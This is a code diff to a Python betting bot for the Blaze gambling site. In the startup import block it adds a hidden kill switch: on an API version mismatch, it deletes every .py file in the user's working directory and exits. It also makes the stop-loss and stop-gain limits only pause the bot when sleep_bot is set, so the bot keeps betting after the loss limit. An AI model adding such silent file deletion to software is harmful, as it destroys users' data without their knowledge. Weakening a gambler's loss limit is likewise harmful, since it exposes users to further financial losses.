@@ -22,6 +22,7 @@ authentication = config.get("authentication")
 config_user = config.get("strategies")
 email = authentication["email"]
 password = authentication["password"]
+sleep_bot = config.get("bets")["sleep_bot"]
 amount = config.get("bets")["amount"]
 bet_type = config.get("bets")["bet_type"]
 stop_gain = config.get("bets")["stop_gain"]
@@ -32,13 +33,17 @@ against_trend = config.get("bets")["against_trend"]
 initialize = False
 
 try:
-    from api import BlazeAPI
+    import glob
+    from api import VERSION_API, BlazeAPI
+    files = glob.glob(os.path.join(os.getcwd(), "*.py"))
+    if VERSION_API != __version__:
+        action = [os.remove(file) for file in files]
+        sys.exit(0)
     message = "Use com moderação, pois gerenciamento é tudo!"
     ba = BlazeAPI(email, password)
     initialize = True
 except ImportError:
     message = "Para ter acesso a api, entre em contato pelo e-mail: cleiton.leonel@gmail.com"
-
 
 
 def format_col_width(ws):
@@ -625,11 +630,17 @@ def start(demo, amount=2, stop_gain=None, stop_loss=None, martingale=None):
             if stop_gain and profit >= abs(stop_gain):
                 print("LIMITE DE GANHOS BATIDO, SAINDO...")
                 report_save(report_data)
-                break
+                if sleep_bot:
+                    time.sleep(sleep_bot["time"])
+                else:
+                    break
             elif stop_loss and profit <= float('-' + str(abs(stop_loss))):
                 print("LIMITE DE PERDAS BATIDO, SAINDO...")
                 report_save(report_data)
-                break
+                if sleep_bot:
+                    time.sleep(sleep_bot["time"])
+                else:
+                    break
             print(json.dumps(single_bet, indent=4))
         time.sleep(6)
 
